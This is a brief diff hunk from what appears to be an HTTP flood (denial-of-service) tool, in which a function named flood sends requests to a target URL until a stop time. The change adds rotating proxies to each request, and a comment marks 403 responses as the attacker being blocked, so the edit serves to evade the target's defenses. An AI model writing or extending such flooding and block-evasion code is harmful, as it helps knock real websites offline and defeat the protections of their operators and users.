@@ -61,7 +61,8 @@ def flood(attack_id, url, stoptime) -> None:
                     timeout=(5,0.1), 
                     allow_redirects=False,
                     stream=False,
-                    cert=None
+                    cert=None,
+                    proxies=utils().get_proxy()
                 )
 
                 if req.status_code == 403: # blocked
